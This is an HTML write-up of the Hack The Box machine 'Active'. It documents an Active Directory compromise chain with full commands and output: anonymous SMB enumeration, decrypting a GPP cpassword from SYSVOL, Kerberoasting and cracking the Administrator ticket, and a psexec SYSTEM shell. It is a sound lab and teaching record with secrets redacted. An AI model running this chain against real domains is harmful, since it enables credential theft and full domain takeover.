@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Active</h1>
+    
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">SMB</span><span class="tag">GPP</span><span class="tag">Kerberoast</span><span class="tag">PSExec</span><span class="tag">john</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#anonymous-smb-enumeration">Anonymous SMB Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#looting-sysvol-for-a-gpp-password">Looting SYSVOL for a GPP Password</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#kerberoasting-the-administrator">Kerberoasting the Administrator</a><a class="lvl2" href="#root">Root</a><a class="lvl3" href="#psexec-as-system">PSExec as SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Active is an easy Hack The Box machine that plays out like a textbook small-AD compromise, and it's a great box for understanding why "low privilege domain user" is so often the only foothold an attacker needs. The path has two halves. First, an anonymous SMB session leads to a <code>Groups.xml</code> file left in the domain's <code>SYSVOL</code> share, which contains a Group Policy Preferences (GPP) password that Microsoft made trivially decryptable. Those credentials then let me <strong>Kerberoast</strong> the Administrator account, crack its service ticket offline, and walk in with <code>psexec</code> as <code>SYSTEM</code>.</p>
+<p>No exploits, no shells dropped on disk for the foothold, every step abuses a legitimate Windows feature that was configured insecurely. That's what makes it realistic.</p>
+<h2 id="recon">Recon</h2>
+<p>These notes pick up at SMB, which is where Active gets interesting. The host advertises the share layout of a Domain Controller (<code>NETLOGON</code>, <code>SYSVOL</code>, <code>Replication</code>), so everything from here is AD enumeration. I started by adding the domain to my hosts file so name-based tooling resolves:</p>
+<pre><code>active.htb -&gt; /etc/hosts
+</code></pre>
+<h3 id="anonymous-smb-enumeration">Anonymous SMB Enumeration</h3>
+<p>The first question against any SMB host is "what can I see without credentials?" A <strong>null session</strong> (<code>-N</code>, no username or password) often still returns the share list:</p>
+<pre><code class="language-sh">smbclient -N -L \\10.129.184.136
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Replication     Disk
+        SYSVOL          Disk      Logon server share
+        Users           Disk
+</code></pre>
+<p>The Guest account was disabled, so this is a true anonymous read. Checking access with SMBMap showed I had <strong>read-only</strong> access to the <code>Replication</code> share as the null user.</p>
+<blockquote>
+<p><strong>Why this matters:</strong> <code>Replication</code> is a copy of <code>SYSVOL</code>, the share every domain-joined machine reads at boot to pull Group Policy. It's world-readable by design. Anything sensitive an admin accidentally stores there is exposed to every account on the domain, including anonymous in misconfigured environments.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="looting-sysvol-for-a-gpp-password">Looting SYSVOL for a GPP Password</h3>
+<p>Rather than click through the share by hand, I let NetExec's <code>spider_plus</code> module crawl it and dump metadata for every file:</p>
+<pre><code class="language-sh">nxc smb 10.129.184.136 -u '' -p '' -M spider_plus
+</code></pre>
+<p>This drops a JSON inventory in <code>/tmp/nxc_spider_plus</code>. Scanning it, one filename jumps out, <code>Groups.xml</code>, sitting under a Group Policy folder:</p>
+<pre><code class="language-json">&quot;active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml&quot;
+</code></pre>
+<p>Pulling that file back reveals a stored credential:</p>
+<pre><code class="language-xml">&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User name=&quot;active.htb\SVC_TGS&quot; ...&gt;&lt;Properties action=&quot;U&quot; ... cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; userName=&quot;active.htb\SVC_TGS&quot;/&gt;&lt;/User&gt;&lt;/Groups&gt;
+</code></pre>
+<p>That gives me a username (<code>SVC_TGS</code>) and a <code>cpassword</code> blob.</p>
+<blockquote>
+<p><strong>What is GPP cpassword?</strong> Group Policy Preferences let admins push settings, including local account passwords, to machines via <code>SYSVOL</code>. The password is AES-encrypted and stored in <code>cpassword</code>. The problem: in 2012 Microsoft <em>published the static AES key</em> in MSDN documentation. So the encryption protects nothing. <strong>MS14-025</strong> removed the ability to create new GPP passwords, but it never cleaned up existing ones, which is why retired boxes (and real domains) still leak them.</p>
+</blockquote>
+<p>Because the key is public, decryption is instant:</p>
+<pre><code class="language-sh">gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
+‹redacted›
+</code></pre>
+<p>I now had valid domain credentials:</p>
+<pre><code>SVC_TGS : ‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="kerberoasting-the-administrator">Kerberoasting the Administrator</h3>
+<p>With any authenticated domain user I can ask the KDC for service tickets. I used Impacket's <code>GetUserSPNs</code> to find accounts with a Service Principal Name and request their tickets:</p>
+<pre><code class="language-sh">impacket-GetUserSPNs -request -dc-ip 10.129.184.136 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+</code></pre>
+<blockquote>
+<p><strong>Why Kerberoasting works:</strong> Any account that has an SPN (typically service accounts) can have a TGS ticket requested for it by <em>any</em> authenticated user. That ticket is encrypted with the service account's NTLM hash. So the KDC hands me a blob I can grind offline, no lockouts, no noise on the target. If the account's password is weak, it cracks. On Active, the <strong>Administrator</strong> account had an SPN, which is the jackpot.</p>
+</blockquote>
+<p>The captured ticket fell quickly to <code>rockyou</code>:</p>
+<pre><code class="language-sh">john GetUserSPNs.out --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›
+</code></pre>
+<p>That yielded domain admin credentials:</p>
+<pre><code>administrator : ‹redacted›
+</code></pre>
+<h2 id="root">Root</h2>
+<h3 id="psexec-as-system">PSExec as SYSTEM</h3>
+<p>With admin creds, Impacket's <code>psexec</code> gives an interactive <code>SYSTEM</code> shell. It works by uploading a service binary to the <code>ADMIN$</code> share, registering it as a Windows service, and starting it, all over SMB, no RDP needed:</p>
+<pre><code class="language-sh">impacket-psexec active.htb/administrator@10.129.184.136
+[*] Found writable share ADMIN$
+[*] Uploading file HIWMrssu.exe
+[*] Creating service ugho on 10.129.184.136.....
+[*] Starting service ugho.....
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<p>Box rooted:</p>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt; type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Null SMB sessions are still worth checking first.</strong> A single anonymous read of <code>Replication</code>/<code>SYSVOL</code> carried the whole foothold.</li>
+<li><strong>GPP passwords are a permanent liability.</strong> MS14-025 stopped new ones but left existing <code>cpassword</code> values readable and decryptable with a public key. Hunt for <code>Groups.xml</code> in <code>SYSVOL</code> on every engagement.</li>
+<li><strong>Kerberoasting needs only one domain account.</strong> Any authenticated user can roast every SPN-bearing account; weak service-account passwords turn that into domain admin.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
